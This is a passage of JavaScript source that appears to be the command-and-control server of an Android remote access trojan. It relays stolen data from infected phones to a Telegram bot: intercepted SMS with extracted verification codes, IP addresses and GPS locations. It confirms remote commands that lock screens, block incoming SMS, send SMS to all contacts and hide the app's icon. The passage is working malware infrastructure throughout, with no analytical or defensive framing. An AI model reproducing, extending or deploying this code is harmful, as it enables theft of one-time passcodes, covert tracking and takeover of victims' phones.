                    ) : await bot.editMessageText(
                       oltg.build("🔴 𓏺|𓏺 user not found"),
                        {
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    )
                }
            })
        }
    }

    async handleUser(socket, message, bot, prt){
        if (message.method == "connect"){
            for (let au of this.accepted_users){
                if (au.device_id == message.device_id){
                    socket.write(JSON.stringify({
                        status: true
                    }));
                    return;
                }
            }

            if (!Object.keys(message).includes("again")){
                message.again = false;
            } else {
                message.again = Boolean(message.again);
            }

            if (!message.again){
                await this.addUser({
                    socket: socket,
                    port: prt.port,
                    device_id: message.device_id,
                    access: message.accessory
                })

                socket.write(JSON.stringify({
                    status: true
                }));
                
                await bot.sendMessage(
                    prt.port.chat_id,
                    oltg.build(`🕸 𓏺|𓏺 new user connected\n\n`) + `🛠 𓏺|𓏺 <code>/sign_${message.device_id}</code>\n` + oltg.build("\n🌐 𓏺|𓏺 ip: ") + `<code>${socket.remoteAddress}</code>` + ` - ${socket.remoteAddress}` + oltg.build(`\n👔 𓏺|𓏺 rat: ${message.rat}\n🗼 𓏺|𓏺 android-version: ${message.android_version}\n📱 𓏺|𓏺 model: `) + message.model + oltg.build(`\n🔋 𓏺|𓏺 battery is %${message.battery}\n🔵 𓏺|𓏺 ${message.accessory.length} access were found\n\n🍁 𓏺|𓏺 `) + `<a href='https://t.me/Vex_Bite'>${oltg.build("universe got big plans for us")}</a>`,
                    {
                        parse_mode: "HTML"
                    }
                )
            } else {
                await this.addUser({
                    socket: socket,
                    port: prt.port,
                    device_id: message.device_id,
                    access: message.accessory
                })

                socket.write(JSON.stringify({
                    status: true
                }));
            }
        } else if (message.method == "receiveSMS"){ 
            let codes = extractCodes(message.sms);
            let needToSend = oltg.build("📪 𓏺|𓏺 new message received") + ` [ <code>${message.model}</code> ]`;
            needToSend += oltg.build(`\n☎️ ${sym} `) + (message.name == undefined ? "unknown" : message.name) + ` [ <code>${(message.phone_number == undefined ? "unknown phone" : message.phone_number)}</code> ]`;
            needToSend += `\n\n<blockquote>📞 ${sym} ${message.operator}\n🌐 ${sym} ${socket.remoteAddress}\n📦 ${sym} ${message.rat} { ${message.version} } </blockquote>`;
            needToSend += `\n\n🔬 ${sym} #${message.device_id}`;
            needToSend += oltg.build(`\n🔒 ${sym} sign by `) + `<code>/sign_${message.device_id}</code>`;
            if (codes != ''){
                needToSend += oltg.build(`\n💠 ${sym} found codes (4:8) : `) + codes;
            }
            await bot.sendMessage(
                prt.port.chat_id,
                // oltg.build(`📪 𓏺|𓏺 new message received\n👤 𓏺|𓏺 `) + `${message.name !== undefined || message.name !== null ? message.name : oltg.build("unknown")} { ${message.phone_number !== undefined || message.phone_number !== null ? message.phone_number : oltg.build("no phone")} }` + (codes !== "" ? oltg.build(`\n💠 𓏺|𓏺 codes: `) + codes : "") + oltg.build("\n📀 𓏺|𓏺 message:") + "\n\n" + message.sms + "\n\n" + oltg.build(`🌐 𓏺|𓏺 ip: `) + socket.remoteAddress + `\n🧮 ${sym} <code>${message.device_id}</code>`,
                needToSend,
                {
                    parse_mode: "HTML"
                }
            )
        } else if (message.method == "getGeoLocation"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${message.latitude},${message.longitude}</code>` + oltg.build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${message.latitude},${message.longitude},15z">${oltg.build("google-map")}</a>`,
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${message.latitude},${message.longitude}</code>` + oltg.build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${message.latitude},${message.longitude},15z">${oltg.build("google-map")}</a>`,
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        } else if (message.method == "vibratePhone"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`⛓ ${sym} phone vibrated for 5 seconds !`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`⛓ ${sym} phone vibrated for 5 seconds !`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        } else if (message.method == "openUrl"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`📢 ${sym} your url has opened in targets device\n🔗 ${sym} ${message.shortcut.url}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`📢 ${sym} your url has opened in targets device\n🔗 ${sym} ${message.shortcut.url}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        } else if (message.method == "sendToast"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`➕ ${sym} toast message has shown-up in targets device !\n➕ ${sym} ${message.shortcut.toast}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`➕ ${sym} toast message has shown-up in targets device !\n➕ ${sym} ${message.shortcut.toast}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        } else if (message.method == "getInstalledApps"){
            for (let p of this.accepted_ports){
                if (p.port == message.port && p.password == message.password){
                    p.socket.write(JSON.stringify({
                        status: true,
                        port: p.port,
                        password: p.password,
                        method: "getInstalledApps",
                        apps: message.apps,
                        shortcut: message.shortcut,
                        device_id: message.shortcut.device_id
                    }));
                    return;
                }
            }
        } else if (message.method == "lockScreen"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔒 ${sym} targets screen locked successfully !`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔒 ${sym} targets screen locked successfully !`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        } else if (message.method == "unlockScreen"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔓 ${sym} targets screen unlocked successfully !`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔓 ${sym} targets screen unlocked successfully !`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        } else if (message.method == "setSoundVolume"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔊 ${sym} volume seted for your target `) + message.device_id + oltg.build(`\n\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔊 ${sym} volume seted for your target `) + message.device_id + oltg.build(`\n\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        } else if (message.method == "setSMSFilter"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`👤 ${sym} the receive sms blocked for `) + message.shortcut.filter_number,
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`👤 ${sym} the receive sms blocked for `) + message.shortcut.filter_number,
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        }  else if (message.method == "removeSMSFilter"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`👤 ${sym} the receive sms unblocked for `) + message.shortcut.filter_number,
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`👤 ${sym} the receive sms unblocked for `) + message.shortcut.filter_number,
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        }  else if (message.method == "sendSMS"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🥌 ${sym} your sms has sent to the `) + message.shortcut.tonumber,
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🥌 ${sym} your sms has sent to the `) + message.shortcut.tonumber,
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        }  else if (message.method == "sendAllSMS"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🥌 ${sym} your sms has sent to the all contacts of device `) + message.shortcut.device_id,
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🥌 ${sym} your sms has sent to the all contacts of device `) + message.shortcut.device_id,
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        } else if (message.method == "hideApp"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🌚 ${sym} app has been hided successfully`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🌚 ${sym} app has been hided successfully`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        }  else if (message.method == "unhideApp"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🌝 ${sym} app has been unhided successfully`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🌝 ${sym} app has been unhided successfully`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        }  else if (message.method == "changeIcon"){
            if (message.status == true){
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🎭 ${sym} your app-icon changed into ${message.shortcut.icon} icon`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🎭 ${sym} your app-icon changed into ${message.shortcut.icon} icon`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            } else {
                message.shortcut.edit ? await bot.editMessageText(
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        parse_mode: "HTML",
                        chat_id: message.shortcut.chat_id,
                        message_id: message.shortcut.message_id
                    }
                ) : await bot.sendMessage(
                    message.shortcut.chat_id,
                    oltg.build(`🔴 ${sym} error detected\n - ${message.message}`),
                    {
                        reply_to_message_id: message.shortcut.message_id
                    }
                )
            }
        }
    }

}

module.exports = { theHandler, oltg };